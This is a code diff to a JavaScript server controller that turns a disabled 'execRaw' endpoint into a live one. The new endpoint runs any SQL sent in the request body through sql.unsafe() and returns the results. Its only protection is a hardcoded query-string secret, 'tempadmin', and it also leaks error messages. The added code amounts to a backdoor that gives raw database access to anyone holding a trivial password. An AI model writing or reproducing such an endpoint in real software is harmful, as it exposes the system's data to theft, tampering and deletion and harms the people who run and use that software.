@@ -52,5 +52,16 @@ export const checkTriggers = async (req, res) => {
 };
 
 export const execRaw = async (req, res) => {
-    res.json({ status: 'disabled' });
+    try {
+        if (req.query.secret !== 'tempadmin') return res.status(403).json({ error: "unauthorized" });
+
+        const q = req.body.query;
+        if (!q) return res.status(400).json({ error: "No query" });
+
+        const result = await sql.unsafe(q);
+        res.json({ status: 'success', result });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ status: 'error', message: error.message });
+    }
 };
